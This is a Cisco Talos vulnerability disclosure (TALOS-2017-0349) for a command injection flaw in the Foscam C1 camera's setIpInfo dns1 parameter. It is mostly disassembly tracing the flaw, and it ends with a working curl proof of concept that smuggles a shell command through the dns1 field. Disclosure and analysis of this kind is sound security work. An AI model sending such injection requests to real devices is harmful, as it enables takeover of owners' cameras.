=== Content from talosintelligence.com_359b24c3_20250125_055744.html ===


* [Cisco Login](/users/auth/saml)

* [Intelligence Center](/reputation)

  + [# Intelligence Center](/reputation)
  + BACK
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* [Vulnerability Research](/vulnerability_info)

  + [# Vulnerability Research](/vulnerability_info)
  + BACK
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* [Incident Response](/incident_response)

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  # Security Resources

  + BACK
  Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* Media

  # Media

  + BACK
  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  # Company

  + BACK
  Company
  + [About Talos](/about)
  + [Careers](/careers)

* Under Attack?
* [Cisco Login](/users/auth/saml)

## Contact Cisco Talos Incident Response

×

Close

This form is for Incident Response service inquiries only, including emergency network security needs.

For reputation or categorization inquiries, visit the [Talos Support site](/support).
For emergency DDoS mitigation assistance, please contact the [Cisco Secure DDoS Protection Team](https://www.cisco.com/c/en/us/products/collateral/security/ddos-emergency-attack-mitigation-aag.pdf).

Name

Company (optional)

Email address

Phone number

Preferred communication:

Email

Phone

What Incident Response Service are you interested in?
General Talos IR services and retainer information
Emergency Response
IR Plan
IR Playbooks
IR Readiness Assessment
Tabletop Exercises
Compromise Assessment
Threat Hunting
Cyber Range Training
Intelligence on Demand

Please provide as much detail as possible so we can best address your needs

I acknowledge that this is an inquiry for Incident Response services and that any other use of this form will not receive a response.

Send Email
Cancel

# Talos Vulnerability Report

### TALOS-2017-0349

## Foscam IP Video Camera CGIProxy.fcgi DNS1 Address Configuration Command Injection Vulnerability

##### June 19, 2017

##### CVE Number

CVE-2017-2847

### Summary

An exploitable command injection vulnerability exists in the web management interface used by the Foscam C1 Indoor HD Camera running application firmware 2.52.2.37. A specially crafted HTTP request can allow for a user to inject arbitrary shell characters during manual network configuration resulting in command injection. An attacker can simply send an HTTP request to the device to trigger this vulnerability.

### Tested Versions

Foscam, Inc. Indoor IP Camera C1 Series
System Firmware Version: 1.9.3.17
Application Firmware Version: 2.52.2.37
Web Version: 2.0.1.1
Plug-In Version: 3.3.0.5

### Product URLs

[Foscam](http://www.foscam.com/)

### CVSSv3 Score

8.8 - CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### CWE

CWE-78: Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)

### Details

Foscam produces a series of IP-capable surveillance devices, network video recorders, and baby monitors for the end-user. Foscam produces a range of cameras for both indoor and outdoor use and with wireless capability. One of these models is the C1 series which contains a web-based user interface for management and is based on the ARM architecture. Foscam is considered one of the most common security cameras out on the current market.

When various services are started, a service will first register a callback using the `CMsgClient::registerMsgHandle` function [1]. This will register a function to be called [2] when another service dispatches a message of the specified code [3]. An example of this registration process is handled inside the `FCGI_Init` function of the “CGIProxy.fcgi” service using the following code:

```
.text:00009F20                       FCGX_Init_1f20
.text:00009F20
.text:00009F20 F0 41 2D E9                       STMFD   SP!, {R4-R8,LR}
.text:00009F24 41 DE 4D E2                       SUB     SP, SP, #0x410
.text:00009F28 08 D0 4D E2                       SUB     SP, SP, #8
.text:00009F2C 05 FC FF EB                       BL      FCGX_Init
.text:00009F2C
.text:00009F30 00 10 50 E2                       SUBS    R1, R0, #0
.text:00009F34 44 01 9F 15                       LDRNE   R0, =str.FCGX_Initfailed
.text:00009F38 05 00 00 1A                       BNE     leave_exit_1f54
.text:00009F3C
.text:00009F3C 40 01 9F E5                       LDR     R0, =gv_theRequest_10b74
.text:00009F40 01 20 A0 E1                       MOV     R2, R1
.text:00009F44 1A FC FF EB                       BL      FCGX_InitRequest
.text:00009F48
.text:00009F48 00 00 50 E3                       CMP     R0, #0
.text:00009F4C 03 00 00 0A                       BEQ     loc_9F60
...
.text:00009F60                       loc_9F60
.text:00009F60 DB FE FF EB                       BL      registerMsgClients_1ad4

.text:00009AD4                       registerMsgClients_1ad4
.text:00009AD4 10 40 2D E9                       STMFD   SP!, {R4,LR}
.text:00009AD4
.text:00009AD8 30 40 9F E5                       LDR     R4, =gp_cMsgClient_bac8
.text:00009ADC 30 10 9F E5                       LDR     R1, =0x40004001                                                ; [3] code
.text:00009AE0 04 00 A0 E1                       MOV     R0, R4
.text:00009AE4 2C 20 9F E5                       LDR     R2, =CgiProxySnapPicHandler_1e38                               ; [2] callback function
.text:00009AE8 3D FD FF EB                       BL      CMsgClient::registerMsgHandle(int,void (*)(char const*,int))   ; [1]
.text:00009AE8
.text:00009AEC 04 00 A0 E1                       MOV     R0, R4
.text:00009AF0 24 10 9F E5                       LDR     R1, =0x3001
.text:00009AF4 1C 20 9F E5                       LDR     R2, =CgiProxySnapPicHandler_1e38
.text:00009AF8 39 FD FF EB                       BL      CMsgClient::registerMsgHandle(int,void (*)(char const*,int))
.text:00009AF8
.text:00009AFC 04 00 A0 E1                       MOV     R0, R4
.text:00009B00 18 10 9F E5                       LDR     R1, =0x3002
.text:00009B04 0C 20 9F E5                       LDR     R2, =CgiProxySnapPicHandler_1e38
.text:00009B08 10 40 BD E8                       LDMFD   SP!, {R4,LR}
.text:00009B0C 34 FD FF EA                       B       CMsgClient::registerMsgHandle(int,void (*)(char const*,int))

```

After the “CGIProxy.fcgi” service decodes an HTTP request that’s forwarded from the HTTP daemon, the service will copy the decoded query into a buffer on the stack [4]. Once this is done, the buffer will then be used to pass the decoded query to `CMsgClient::sendMsg`. This will dispatch the query to the shared messaging subsystem using the code 0x4001 at [5]. At this point, the service that handles the specified code will be woken up to handle the specified request.

```
.text:00009FA8 14 70 8D E2                       ADD     R7, SP, #0x430+lv_dest_41c
.text:00009FAC 08 10 A0 E1                       MOV     R1, R8
.text:00009FB0 07 00 A0 E1                       MOV     R0, R7
.text:00009FB4 34 FC FF EB                       BL      strcpy                     ; [4]
.text:00009FB8
.text:00009FB8 08 00 A0 E1                       MOV     R0, R8
.text:00009FBC C0 FB FF EB                       BL      strlen
.text:00009FC0
.text:00009FC0 CC 30 9F E5                       LDR     R3, =0x404
.text:00009FC4 00 30 8D E5                       STR     R3, [SP]
.text:00009FC8 C8 10 9F E5                       LDR     R1, =0x4001                ; [5]
.text:00009FCC 07 30 A0 E1                       MOV     R3, R7                     ; uri request
.text:00009FD0 01 20 A0 E3                       MOV     R2, #1
.text:00009FD4 04 40 8D E5                       STR     R4, [SP,#4]
.text:00009FD8 08 40 8D E5                       STR     R4, [SP,#8]
.text:00009FDC 0C 40 8D E5                       STR     R4, [SP,#12]
.text:00009FE0 14 04 8D E5                       STR     R0, [SP,#0x430+var_1C]
.text:00009FE4 B0 00 9F E5                       LDR     R0, =gp_cMsgClient_bac8
.text:00009FE8 CD FB FF EB                       BL      CMsgClient::sendMsg(int,char,char const*,int,int,int,char *)

```

The handler for code 0x4001 is in the “webService” binary and is done by the function `executeCGICmd` at address 0x1e5a4. At the beginning of this function, the service will call a function [6] that’s responsible for extracting the user name, password, and command that was specified within the user’s query. Once the parameters have been extracted and copied into a local buffer on the stack, the command will be passed to the function call at [7] in order to determine the correct command function which is stored to `funcptr`. If authentication is not required for the command, then the branch at [8] will execute the function pointer returned by `findJsonCallbackCommand` at [7]. If authentication is required from the command, then the user name and password will be checked via `strcmp` and then the function call at [9] will execute the function pointer.

```
.text:0001E5A4                       executeCGICmd
.text:0001E5A4
.text:0001E5A4 F0 41 2D E9                       STMFD   SP!, {R4-R8,LR}
.text:0001E5A8 28 60 80 E2                       ADD     R6, R0, #0x28
.text:0001E5AC 11 DD 4D E2                       SUB     SP, SP, #0x440
.text:0001E5B0 00 80 A0 E1                       MOV     R8, R0
.text:0001E5B4 06 10 A0 E1                       MOV     R1, R6
.text:0001E5B8 C4 00 9F E5                       LDR     R0, =unk_D5A68
.text:0001E5BC 3A 2A 00 EB                       BL      sub_28EAC                          ; [6]

.text:00028EAC                       sub_28EAC
.text:00028EAC
.text:00028EAC F0 47 2D E9                       STMFD   SP!, {R4-R10,LR}
.text:00028EB0 00 40 51 E2                       SUBS    R4, R1, #0
.text:00028EB4 00 80 A0 E1                       MOV     R8, R0
.text:00028EB8 46 DF 4D E2                       SUB     SP, SP, #0x118
.text:00028EBC 00 00 E0 03                       MOVEQ   R0, #0xFFFFFFFF
.text:00028EC0 8B 00 00 0A                       BEQ     leaving_290F4
...
.text:00028F4C 00 00 50 E3                       CMP     R0, #0
.text:00028F50 0C 00 00 1A                       BNE     findCmdCallback_28F88
...
.text:00028F88                       findCmdCallback_28F88
.text:00028F88 05 00 A0 E1                       MOV     R0, R5
.text:00028F8C 45 1F 8D E2                       ADD     R1, SP, #0x138+lp_funcptr?_24
.text:00028F90 89 FC FF EB                       BL      findJsonCallbackCommand_281BC      ; [7]
.text:00028F94 00 90 50 E2                       SUBS    R9, R0, #0
.text:00028F98 06 00 00 0A                       BEQ     checkIfAuthNeeded_28FB8
...
.text:00028FB8                       checkIfAuthNeeded_28FB8
.text:00028FB8 14 31 9D E5                       LDR     R3, [SP,#0x138+lp_funcptr?_24]
.text:00028FBC 54 21 9F E5                       LDR     R2, =0xFFFF
.text:00028FC0 08 10 93 E5                       LDR     R1, [R3,#8]
.text:00028FC4 02 00 51 E1                       CMP     R1, R2
.text:00028FC8 06 00 00 1A                       BNE     authenticate_28FE8
...
.text:00028FD8 04 00 A0 E1                       MOV     R0, R4
.text:00028FDC 33 FF 2F E1                       BLX     R3                                 ; [8]
.text:00028FE0 09 00 A0 E1                       MOV     R0, R9
.text:00028FE4 42 00 00 EA                       B       leaving_290F4
...
.text:000290E0 04 00 A0 E1                       MOV     R0, R4
.text:000290E4 33 FF 2F E1                       BLX     R3                                 ; [9]
.text:000290E8 05 00 A0 E1                       MOV     R0, R5
.text:000290EC 00 00 00 EA                       B       leaving_290F4
...
.text:000290F4 46 DF 8D E2                       ADD     SP, SP, #0x118
.text:000290F8 F0 87 BD E8                       LDMFD   SP!, {R4-R10,PC}

```

When handling the “CGIProxy.fcgi” command “setIpInfo”, the function `setIpInfo_37f30` will be called. This function is responsible for setting up the interface either via dhcp or by manually setting an IP address, netmask, gateway and dns. At the beginning of the function, the parameters [10] for “callbackJson”, “isDHCP”, “ip”, “gate”, “mask”, “dns1”, “dns2” are extracted from the query.
Afterwards, the “isDHCP” value [11] is checked against 0 and if it is, the the “ip” and “mask” parameter values are passed to the function `sub_3FE28` [12] to be parsed using `inet_addr`: 0 is returned if parameters are correctly parsed, -1 otherwise. The return value is passed via IPC via code 0x3001 [13], which is handled by the binary “CGIProxy.fcgi” and takes care of returning the error code as result of the operation.
Regardless the “ip” and “mask” parameters were parsed correctly or not, the execution will continue and another message is sent with code 0x601d via IPC [14].

```
.text:0003FF30                       setIpInfo_37f30
.text:0003FF30
.text:0003FF30 F0 40 2D E9                       STMFD   SP!, {R4-R7,LR}
...
.text:0003FF54 38 11 9F E5                       LDR     R1, =str.callbackJson
.text:0003FF58 BA A0 FF EB                       BL      extract_param                      ; [10]
...
.text:0003FF60 30 11 9F E5                       LDR     R1, =str.isDHCP
...
.text:0003FF68 B6 A0 FF EB                       BL      extract_param                      ; [10]
...
.text:0003FF7C 18 11 9F E5                       LDR     R1, =str.ip
...
.text:0003FF98 AA A0 FF EB                       BL      extract_param                      ; [10]
...
.text:0003FFA0 F8 10 9F E5                       LDR     R1, =str.gate
...
.text:0003FFAC A5 A0 FF EB                       BL      extract_param                      ; [10]
.text:0003FFB0 EC 10 9F E5                       LDR     R1, =str.mask
...
.text:0003FFBC A1 A0 FF EB                       BL      extract_param                      ; [10]
.text:0003FFC0 E0 10 9F E5                       LDR     R1, =str.dns1
...
.text:0003FFCC 9D A0 FF EB                       BL      extract_param                      ; [10]
...
.text:0003FFD4 D0 10 9F E5                       LDR     R1, =str.dns2
...
.text:0003FFDC 99 A0 FF EB                       BL      extract_param                      ; [10]
.text:0003FFE0 1C 34 DD E5                       LDRB    R3, [SP,#0x4E0+var_C4]             ; [11]
.text:0003FFE4 00 00 53 E3                       CMP     R3, #0
.text:0003FFE8 05 00 00 1A                       BNE     loc_40004
.text:0003FFEC 07 00 A0 E1                       MOV     R0, R7                             ; "ip" value
.text:0003FFF0 06 10 A0 E1                       MOV     R1, R6                             ; "mask" value
.text:0003FFF4 8B FF FF EB                       BL      sub_3FE28                          ; [12]
.text:0003FFF8 00 00 50 E3                       CMP     R0, #0
.text:0003FFFC 00 20 E0 13                       MOVNE   R2, #0xFFFFFFFF
.text:00040000 00 00 00 1A                       BNE     loc_40008
.text:00040004
.text:00040004                       loc_40004
.text:00040004 00 20 A0 E3                       MOV     R2, #0
.text:00040008
.text:00040008                       loc_40008
...
.text:00040034 7C 10 9F E5                       LDR     R1, =0x3001                        ; [13]
...
.text:00040050 81 4A FF EB                       BL      CMsgClient::sendMsg()
...
.text:00040068 54 10 9F E5                       LDR     R1, =0x601D                        ; [14]
...
.text:00040084 74 4A FF EB                       BL      CMsgClient::sendMsg()
...
.text:00040090 F0 80 BD E8                       LDMFD   SP!, {R4-R7,PC}

```

Code 0x601d is handled in the “devMng” binary by the function `OnDevMngMsgSetIpInfo_120ac`. The function extracts “isDHCP”, ip”, “mask”, “gate”, “dns1” and “dns2” parameters from the IPC call and passes them to the function `sub_3D880` [15].
This function checks a global variable for the state of the operation. In this first call, the branch is not taken and the function will only call `sub_37ED8` [17], which saves all the parameters in “/mnt/mtd/app/config/NetworkConfig.bin”. Parameters are also saved in a global structure, to allow access from concurring threads.
If no errors are returned, `OnDevMngMsgSetIpInfo_120ac` will call `sub_3AAE4` [19] by passing the pointer to a global structure [18]. The purpose of this function is to flag the completion of the interfaces configuration by putting “1” into the structure, at 0x8822c [20].

```
.text:0001A0AC                       OnDevMngMsgSetIpInfo_120ac
.text:0001A0AC
.text:0001A0AC 70 40 2D E9                       STMFD   SP!, {R4-R6,LR}
...
.text:0001A140 CE 8D 00 EB                       BL      sub_3D880                          ; [15]

.text:0003D880                       sub_3D880
.text:0003D880
.text:0003D880 F0 45 2D E9                       STMFD   SP!, {R4-R8,R10,LR}
...
.text:0003D898 00 20 D2 E5                       LDRB    R2, [R2]                           ; [16]
.text:0003D89C 1A 00 00 0A                       BEQ     loc_3D90C
.text:0003D8A0 00 00 52 E3                       CMP     R2, #0
...
.text:0003D8BC 05 10 A0 E1                       MOV     R1, R5
.text:0003D8C0 04 30 D1 E4                       LDRB    R3, [R1],#4
.text:0003D8C4 10 30 C4 E5                       STRB    R3, [R4,#0x10]
.text:0003D8C8 14 00 84 E2                       ADD     R0, R4, #0x14
.text:0003D8CC 9E 52 FF EB                       BL      std::string::operator=(std::string const&)
.text:0003D8D0 08 10 85 E2                       ADD     R1, R5, #8
.text:0003D8D4 18 00 84 E2                       ADD     R0, R4, #0x18
.text:0003D8D8 9B 52 FF EB                       BL      std::string::operator=(std::string const&)
.text:0003D8DC 0C 10 85 E2                       ADD     R1, R5, #0xC
.text:0003D8E0 1C 00 84 E2                       ADD     R0, R4, #0x1C
.text:0003D8E4 98 52 FF EB                       BL      std::string::operator=(std::string const&)
.text:0003D8E8 10 10 85 E2                       ADD     R1, R5, #0x10
.text:0003D8EC 20 00 84 E2                       ADD     R0, R4, #0x20
.text:0003D8F0 95 52 FF EB                       BL      std::string::operator=(std::string const&)
.text:0003D8F4 24 00 84 E2                       ADD     R0, R4, #0x24
.text:0003D8F8 14 10 85 E2                       ADD     R1, R5, #0x14
.text:0003D8FC 92 52 FF EB                       BL      std::string::operator=(std::string const&)
.text:0003D900 10 00 84 E2                       ADD     R0, R4, #0x10
.text:0003D904 73 E9 FF EB                       BL      sub_37ED8                          ; [17]
...
.text:0003E078 F0 85 BD E8                       LDMFD   SP!, {R4-R8,R10,PC}

...                                  OnDevMngMsgSetIpInfo_120ac
...
.text:0001A144 01 00 70 E3                       CMN     R0, #1
.text:0001A148 04 00 00 0A                       BEQ     loc_1A160
.text:0001A14C 54 00 9F E5                       LDR     R0, =dword_85D88                   ; [18]
...
.text:0001A15C 60 82 00 EB                       BL      sub_3AAE4                          ; [19]

.text:0003AAE4                       sub_3AAE4
...
.text:0003AB08 00 40 A0 E1                       MOV     R4, R0
...
.text:0003ABCC 34 30 9F E5                       LDR     R3, =0x24A4
.text:0003ABD0 01 20 A0 E3                       MOV     R2, #1
.text:0003ABD4 03 20 C4 E7                       STRB    R2, [R4,R3]                        ; [20]

```

The application creates 13 threads in total at startup. One of them is continuously polling for network changes: `sub_42DE0`. Two functions are called in a loop: one for softAP configuration [21] and one for wifi and ethernet connections [22]. We will explore the latter.

```
.text:00042DE0                       sub_42DE0
.text:00042DE0
.text:00042DE0 38 40 2D E9                       STMFD   SP!, {R3-R5,LR}
.text:00042DE4 00 40 A0 E1                       MOV     R4, R0
.text:00042DE8 06 50 A0 E3                       MOV     R5, #6
.text:00042DEC
.text:00042DEC                       loc_42DEC
.text:00042DEC 05 10 A0 E1                       MOV     R1, R5
.text:00042DF0 04 00 A0 E1                       MOV     R0, R4
.text:00042DF4 68 E6 FF EB                       BL      sub_3C79C                          ; [21]
.text:00042DF8 00 10 A0 E1                       MOV     R1, R0
.text:00042DFC 04 00 A0 E1                       MOV     R0, R4
.text:00042E00 BE FE FF EB                       BL      sub_42900                          ; [22]
.text:00042E04 00 50 A0 E1                       MOV     R5, R0
.text:00042E08 04 00 9F E5                       LDR     R0, =0xF4240
.text:00042E0C 51 3D FF EB                       BL      usleep
.text:00042E10 F5 FF FF EA                       B       loc_42DEC                          ; loop

```

`sub_42900` is the function that actually checks for the value of the global variable at 0x8822c [23]. As soon as its value is not 0, the function `sub_428E0` is called.

```
.text:00042D4C 88 30 9F E5                       LDR     R3, =0x24A4
.text:00042D50 03 20 D4 E7                       LDRB    R2, [R4,R3]                        ; [23]
.text:00042D54 00 00 52 E3                       CMP     R2, #0
.text:00042D58 04 00 00 0A                       BEQ     loc_42D70
.text:00042D5C 00 20 A0 E3                       MOV     R2, #0
.text:00042D60 03 20 C4 E7                       STRB    R2, [R4,R3]
.text:00042D64 04 00 A0 E1                       MOV     R0, R4
.text:00042D68 05 10 A0 E1                       MOV     R1, R5
.text:00042D6C DB FE FF EB                       BL      sub_428E0

```

At this point the execution will continue with many different calls, from a higher level perspective the following is the path that will be taken, stripped to only interesting the stubs (capital names are user-controlled strings):

```
```
sub_428E0
    sub_3FB2C
        sub_3B94C
            system("ifconfig eth0 0.0.0.0")
            system("ifconfig ra0 up")
            sub_3B8F0
                sub_3A95C
                    system("rm -rf /var/run/wpa_supplicant")
                    system("ifconfig ra0 down")
                    system("killall wpa_supplicant")
                sub_3B804
                    system("ifconfig ra0 up")
    sub_4286C
        sub_3E164
            system("ifconfig ra0 0.0.0.0")
            system("ifconfig ra0 down")
            sub_3D880
                system("killall udhcpc")
                fork()
                    child: execlp("ifconfig", "ifconfig", "eth0", IP, "netmask", NETMASK)
                fork()
                    child: execlp("sh", "sh", "-c", "route del default dev eth0")
                fork()
                    child: execlp("sh", "sh", "-c", "route add default gw GATEWAY dev eth0")
                fork()
                    child: execlp("sh", "sh", "-c", "echo nameserver DNS1 > /etc/resolv.conf")
                fork()
                    child: execlp("sh", "sh", "-c", "echo nameserver DNS2 >> /etc/resolv.conf")
            system("killall -9 OnvifAgent")
```

```

Function `sub_3E164` fetches the parameters from a global structure and passes them to `sub_3D880`.
Function `sub_3D880` was already called before, but this time the global state is different. The function thus takes a different branch and the actual interface configuration takes place. User-supplied parameters are taken unmodified from a global structure.
In this function the dns1 parameter [24] is never sanitized and used in a `sprintf` [25] call to build the final command that will be passed to `execlp` [26].

```
.text:0003DF90 B4 11 9F E5                   LDR     R1, =str.echonameservers1        ; "echo nameserver %s > /etc/resolv.conf"
.text:0003DF94 10 20 95 E5                   LDR     R2, [R5,#0x10]                   ; [24]
.text:0003DF98 04 00 A0 E1                   MOV     R0, R4
.text:0003DF9C 66 53 FF EB                   BL      sprintf                          ; [25]
.text:0003DFA0 A4 53 FF EB                   BL      fork
.text:0003DFA4 00 30 50 E2                   SUBS    R3, R0, #0
.text:0003DFA8 0C 00 00 1A                   BNE     loc_3DFE0
.text:0003DFAC 88 01 9F E5                   LDR     R0, =str.sh                      ; "sh"
.text:0003DFB0 00 30 8D E5                   STR     R3, [SP,#0xD8+var_D8]
.text:0003DFB4 00 10 A0 E1                   MOV     R1, R0
.text:0003DFB8 80 21 9F E5                   LDR     R2, =str._c                      ; "-c"
.text:0003DFBC 04 30 A0 E1                   MOV     R3, R4                           ; [26]
.text:0003DFC0 CC 53 FF EB                   BL      execlp

```
### Exploit Proof-of-Concept

This vulnerability is reachable by the “setIpInfo” command and requires a valid user account with administrator privileges. The following proof of concept shows how to execute an arbitrary command.

```
```
$ sUsr="admin"
$ sPwd=""
$ sIP=192.168.0.20
$ sMask=255.255.255.0
$ sGW=192.168.0.1
$ sDns1=1.1.1.1
$ sDns2=2.2.2.2
$ sCmd=`perl -MURI::Escape -e 'print uri_escape(";id>/tmp/www/inj;")'`
$ curl "http://$SERVER/cgi-bin/CGIProxy.fcgi?usr=guest&pwd=asd0--&cmd=setIpInfo&isDHCP=0&ip=${sIP}&mask=${sMask}&gate=${sGW}&dns1=${sDns1}${sCmd}&dns2=${sDns2}"
```

```
### Timeline

2017-05-30 - Vendor Disclosure

2017-06-19 - Public Release

##### Credit

Discovered by Claudio Bozzato of Cisco Talos.

---

[Vulnerability Reports](/vulnerability_reports) [Next Report

TALOS-2017-0350](/vulnerability_reports/TALOS-2017-0350) [Previous Report

TALOS-2017-0348](/vulnerability_reports/TALOS-2017-0348)

* + ###### [Intelligence Center](/reputation)
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* + ###### [Vulnerability Research](/vulnerability_info)
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* + ###### [Incident Response](/incident_response)
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* + ###### Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* + ###### Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* + ###### Support
  + [Support Documentation](https://support.talosintelligence.com)
* + ###### Company
  + [About Talos](/about)
  + [Careers](/careers)
  + [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)

###### Follow us

[![Cisco](/assets/logo_cisco_white-d87b7f7d3152ad412e48aad924a972cc5b802b7a53cb56b0792a4456c9b7b3a5.svg)](http://tools.cisco.com/security/center/home.x)

©
2025
Cisco Systems, Inc. and/or its affiliates. All rights
reserved. View our
[Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)


